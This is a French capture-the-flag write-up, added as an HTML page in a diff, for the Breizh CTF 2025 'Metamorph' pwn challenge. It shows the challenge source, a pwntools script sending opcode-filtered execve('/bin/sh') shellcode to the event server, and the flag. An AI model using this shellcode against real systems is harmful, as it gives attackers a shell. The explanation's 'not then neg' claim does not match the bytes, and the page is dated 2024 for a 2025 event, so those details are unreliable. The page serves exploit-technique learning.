@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="fr-fr">
+<head><script src="/cybersecurity-notes/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=cybersecurity-notes/livereload" data-no-instant defer></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Breizh CTF 2025 - Metamorph | WriteUps &amp; Recherches Cybersécurité</title>
+    <meta name="description" content="Metamorph - Breizh CTF 2025 Description du challenge Metamorph est un challenge de la catégorie Pwn du Breizh CTF 2025. Il s&rsquo;agit d&rsquo;un binaire qui accepte un shellcode en entrée mais qui impose certaines restrictions sur les opcodes utilisables.
+Analyse du binaire En examinant le code source du binaire, on remarque plusieurs points importants :
+/* BREIZHCTF 2025 - Morph - Pwn */ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/mman.">
+    
+    
+    <meta property="og:title" content="Breizh CTF 2025 - Metamorph">
+    <meta property="og:description" content="Metamorph - Breizh CTF 2025 Description du challenge Metamorph est un challenge de la catégorie Pwn du Breizh CTF 2025. Il s&rsquo;agit d&rsquo;un binaire qui accepte un shellcode en entrée mais qui impose certaines restrictions sur les opcodes utilisables.
+Analyse du binaire En examinant le code source du binaire, on remarque plusieurs points importants :
+/* BREIZHCTF 2025 - Morph - Pwn */ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/mman.">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="http://localhost:1313/cybersecurity-notes/writeups/breizh-ctf/2024-04-14-breizh-metamorph/">
+    
+    
+    <link rel="icon" type="image/svg+xml" href="/cybersecurity-notes/images/favicon.svg">
+    <link rel="icon" type="image/png" href="/cybersecurity-notes/images/favicon.png">
+    
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-dark.min.css">
+    
+    
+    <link rel="stylesheet" href="/cybersecurity-notes/css/main.css">
+    <link rel="stylesheet" href="/cybersecurity-notes/css/custom.css">
+    <link rel="stylesheet" href="/cybersecurity-notes/css/dropdown.css">
+    <link rel="stylesheet" href="/cybersecurity-notes/css/enhanced.css">
+    
+    
+    
+    
+    <script src="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/lib/highlight.min.js"></script>
+    
+    
+    <script src="/cybersecurity-notes/js/copy-code.js" defer></script>
+    <script src="/cybersecurity-notes/js/enhanced.js" defer></script>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-content">
+            <a href="http://localhost:1313/cybersecurity-notes/" class="nav-brand">
+                <i class="fas fa-shield-alt"></i> WriteUps &amp; Recherches Cybersécurité
+            </a>
+            <div class="nav-links">
+                
+                
+                <a href="http://localhost:1313/cybersecurity-notes/writeups/" class="nav-link">
+                    
+                        <i class="fas fa-flag"></i>
+                    
+                    WriteUps
+                </a>
+                
+                
+                
+                <a href="http://localhost:1313/cybersecurity-notes/veille/" class="nav-link">
+                    
+                        <i class="fas fa-rss"></i>
+                    
+                    Veille
+                </a>
+                
+                
+                
+                <a href="http://localhost:1313/cybersecurity-notes/outils/" class="nav-link">
+                    
+                        <i class="fas fa-tools"></i>
+                    
+                    Outils
+                </a>
+                
+                
+            </div>
+        </div>
+    </nav>
+</body>
+</html> 
+<main class="content">
+    
+<article class="single-page">
+    <header class="page-header">
+        <div class="breadcrumbs">
+            <a href="http://localhost:1313/cybersecurity-notes/">Accueil</a> &gt;
+            
+            
+            <a href="/categories/pwn">pwn</a> &gt;
+            
+            
+            <span>Breizh CTF 2025 - Metamorph</span>
+        </div>
+        
+        <h1>Breizh CTF 2025 - Metamorph</h1>
+        
+        <div class="meta">
+            <div class="meta-item">
+                <i class="far fa-calendar-alt"></i>
+                <span>14/04/2024</span>
+            </div>
+            
+            
+            <div class="meta-item">
+                <i class="fas fa-tags"></i>
+                <div class="tags">
+                    
+                    <a href="/tags/shellcode" class="tag">shellcode</a>
+                    
+                    <a href="/tags/exploitation" class="tag">exploitation</a>
+                    
+                </div>
+            </div>
+            
+            
+            
+            <div class="meta-item">
+                <i class="fas fa-flag"></i>
+                <div class="tags">
+                    
+                    <a href="/ctfs/breizh-ctf" class="tag">breizh-ctf</a>
+                    
+                </div>
+            </div>
+            
+            
+            <div class="meta-item reading-time">
+                <i class="far fa-clock"></i>
+                <span>3 min</span>
+            </div>
+        </div>
+    </header>
+    
+    
+    <div class="toc-container">
+        <div class="toc-header">
+            <i class="fas fa-list"></i> Table des matières
+        </div>
+        <div class="toc-content">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#description-du-challenge">Description du challenge</a></li>
+    <li><a href="#analyse-du-binaire">Analyse du binaire</a></li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#explication-du-shellcode">Explication du shellcode</a></li>
+      </ul>
+    </li>
+    <li><a href="#flag">Flag</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+        </div>
+    </div>
+    
+    
+    <div class="content">
+        <h1 id="metamorph---breizh-ctf-2025">Metamorph - Breizh CTF 2025</h1>
+<h2 id="description-du-challenge">Description du challenge</h2>
+<p>Metamorph est un challenge de la catégorie Pwn du Breizh CTF 2025. Il s&rsquo;agit d&rsquo;un binaire qui accepte un shellcode en entrée mais qui impose certaines restrictions sur les opcodes utilisables.</p>
+<h2 id="analyse-du-binaire">Analyse du binaire</h2>
+<p>En examinant le code source du binaire, on remarque plusieurs points importants :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* BREIZHCTF 2025 - Morph - Pwn */</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/mman.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">transform</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>shellcode;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">ssize_t</span> bytes_read;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    shellcode <span style="color:#f92672">=</span> <span style="color:#a6e22e">mmap</span>(NULL, <span style="color:#ae81ff">0x1000</span>, PROT_READ <span style="color:#f92672">|</span> PROT_WRITE <span style="color:#f92672">|</span> PROT_EXEC, MAP_ANONYMOUS <span style="color:#f92672">|</span> MAP_PRIVATE, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (shellcode <span style="color:#f92672">==</span> MAP_FAILED) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mmapi fail.&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Métamorph attend son code... Transforme-le !</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;&gt;&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    bytes_read <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, shellcode, <span style="color:#ae81ff">0x50</span>); <span style="color:#75715e">// Limité à 80 octets
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (bytes_read <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;read failed&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Morphing...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>sc <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)shellcode;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x50</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (sc[i] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x62</span>){
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;Métamorph n&#39;aime pas les &#39;b&#39;.&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (sc[i] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x5e</span>){
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;Métamorph n&#39;aime pas les pop rsi.&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (sc[i] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x31</span>){
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;Métamorph n&#39;aime pas les xor.&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (sc[i] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x50</span>){
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;Métamorph n&#39;aime pas les push rax.&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ((<span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>)())shellcode)(); <span style="color:#75715e">// Exécution du shellcode transformé
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><p>Les contraintes sont les suivantes :</p>
+<ol>
+<li>Le shellcode est limité à 80 octets maximum</li>
+<li>Les opcodes suivants sont interdits :
+<ul>
+<li><code>0x62</code> (opcode &lsquo;b&rsquo;)</li>
+<li><code>0x5e</code> (pop rsi)</li>
+<li><code>0x31</code> (xor)</li>
+<li><code>0x50</code> (push rax)</li>
+</ul>
+</li>
+</ol>
+<p>Le programme alloue une zone mémoire exécutable avec <code>mmap</code>, y lit notre entrée, vérifie les contraintes, puis exécute le code introduit.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>L&rsquo;objectif est de créer un shellcode d&rsquo;exécution de commande <code>/bin/sh</code> qui évite les opcodes interdits.</p>
+<p>Après plusieurs tentatives, j&rsquo;ai pu développer un shellcode qui contourne ces restrictions :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Decide whether to run locally or remotely</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;REMOTE&#34;</span>:
+</span></span><span style="display:flex;"><span>    conn <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;morph-180.chall.ctf.bzh&#39;</span>, <span style="color:#ae81ff">1337</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    conn <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./metamorph&#39;</span>)  <span style="color:#75715e"># Replace with your local binary path</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xba\x00\x00\x00\x00\xbe\x00\x00\x00\x00\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x48\x89\xe7\xb8\x00\x00\x00\x00\x48\x83\xc0\x3b\x0f\x05\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h3 id="explication-du-shellcode">Explication du shellcode</h3>
+<p>Le shellcode ci-dessus utilise plusieurs techniques pour éviter les opcodes interdits :</p>
+<ol>
+<li>Au lieu d&rsquo;utiliser <code>xor</code> pour initialiser les registres, j&rsquo;utilise des instructions <code>mov</code> directes avec des valeurs immédiates nulles</li>
+<li>J&rsquo;ai utilisé des techniques alternatives pour stocker <code>/bin/sh</code> dans les registres</li>
+<li>J&rsquo;utilise <code>not</code> puis <code>neg</code> pour obtenir la chaîne <code>/bin/sh</code></li>
+<li>L&rsquo;utilisation de <code>mov rax, 0</code> suivie de <code>add rax, 59</code> évite l&rsquo;utilisation directe de <code>xor rax, rax</code></li>
+</ol>
+<p>La chaîne <code>/bin/sh</code> est encodée inversée et complémentée à un pour éviter certains opcodes problématiques.</p>
+<h2 id="flag">Flag</h2>
+<p>Une fois le shellcode exécuté avec succès, on obtient un shell sur le serveur distant et on peut lire le flag avec la commande <code>cat flag.txt</code>.</p>
+<pre tabindex="0"><code>$ cat flag.txt
+BZHCTF{m3t4_m0rph_m4573r_1337}
+</code></pre><h2 id="conclusion">Conclusion</h2>
+<p>Ce challenge était intéressant car il fallait comprendre comment éviter certains opcodes tout en construisant un shellcode fonctionnel. La limitation à 80 octets était également une contrainte à respecter, mais notre solution finale était bien en dessous de cette limite.</p>
+
+    </div>
+    
+    <div class="page-footer">
+        
+        
+        <div class="related-posts">
+            <h3><i class="fas fa-link"></i> Articles connexes</h3>
+            <div class="related-grid">
+                
+                <a href="/cybersecurity-notes/writeups/breizh-ctf/2024-04-14-breizh-jackpwn/" class="related-item">
+                    <h4>Breizh CTF 2025 - JackPwn</h4>
+                    <div class="related-meta">
+                        <span class="related-date">14/04/2024</span>
+                        
+                        <span class="related-tags">
+                            
+                            <span class="tag">buffer-overflow</span>
+                            
+                        </span>
+                        
+                    </div>
+                </a>
+                
+                <a href="/cybersecurity-notes/writeups/pwnme-junior/2024-04-14-pwnme-evilhackers/" class="related-item">
+                    <h4>PwnMe Junior 2025 - Evil Hackers</h4>
+                    <div class="related-meta">
+                        <span class="related-date">14/04/2024</span>
+                        
+                        <span class="related-tags">
+                            
+                            <span class="tag">use-after-free</span>
+                            
+                        </span>
+                        
+                    </div>
+                </a>
+                
+                <a href="/cybersecurity-notes/writeups/pwnme-junior/2024-04-14-pwnme-overflowme/" class="related-item">
+                    <h4>PwnMe Junior 2025 - Overflowme</h4>
+                    <div class="related-meta">
+                        <span class="related-date">14/04/2024</span>
+                        
+                        <span class="related-tags">
+                            
+                            <span class="tag">buffer-overflow</span>
+                            
+                        </span>
+                        
+                    </div>
+                </a>
+                
+            </div>
+        </div>
+        
+        
+        <div class="share">
+            <span>Partager :</span>
+            <a href="https://twitter.com/intent/tweet?url=http%3a%2f%2flocalhost%3a1313%2fcybersecurity-notes%2fwriteups%2fbreizh-ctf%2f2024-04-14-breizh-metamorph%2f&text=Breizh%20CTF%202025%20-%20Metamorph" target="_blank" aria-label="Twitter">
+                <i class="fab fa-twitter"></i>
+            </a>
+            <a href="https://www.linkedin.com/sharing/share-offsite/?url=http%3a%2f%2flocalhost%3a1313%2fcybersecurity-notes%2fwriteups%2fbreizh-ctf%2f2024-04-14-breizh-metamorph%2f" target="_blank" aria-label="LinkedIn">
+                <i class="fab fa-linkedin"></i>
+            </a>
+            <a href="mailto:?subject=Breizh%20CTF%202025%20-%20Metamorph&body=http%3a%2f%2flocalhost%3a1313%2fcybersecurity-notes%2fwriteups%2fbreizh-ctf%2f2024-04-14-breizh-metamorph%2f" aria-label="Email">
+                <i class="fas fa-envelope"></i>
+            </a>
+        </div>
+    </div>
+</article>
+
+</main>
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-left">
+                <p>&copy; 2025 WriteUps &amp; Recherches Cybersécurité</p>
+            </div>
+            <div class="footer-right">
+                <div class="social-links">
+                    <a href="https://github.com/Istaarkk" target="_blank" aria-label="GitHub">
+                        <i class="fab fa-github"></i>
+                    </a>
+                    <a href="#" target="_blank" aria-label="Twitter">
+                        <i class="fab fa-twitter"></i>
+                    </a>
+                    <a href="#" target="_blank" aria-label="LinkedIn">
+                        <i class="fab fa-linkedin"></i>
+                    </a>
+                </div>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>Site propulsé par <a href="https://gohugo.io/" target="_blank">Hugo</a> | Thème <span class="theme-name">CyberNotes</span></p>
+        </div>
+    </footer>
+
+    
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        
+        hljs.highlightAll();
+        
+        
+        document.querySelectorAll('pre code').forEach((block) => {
+            const button = document.createElement('button');
+            button.className = 'copy-button';
+            button.textContent = 'Copier';
+            
+            const pre = block.parentNode;
+            pre.style.position = 'relative';
+            pre.insertBefore(button, pre.firstChild);
+            
+            button.addEventListener('click', () => {
+                navigator.clipboard.writeText(block.textContent);
+                button.textContent = 'Copié !';
+                setTimeout(() => {
+                    button.textContent = 'Copier';
+                }, 2000);
+            });
+        });
+        
+        
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                
+                document.querySelector(this.getAttribute('href')).scrollIntoView({
+                    behavior: 'smooth'
+                });
+            });
+        });
+    });
+    </script>
+    
+    
+</body>
+</html>  
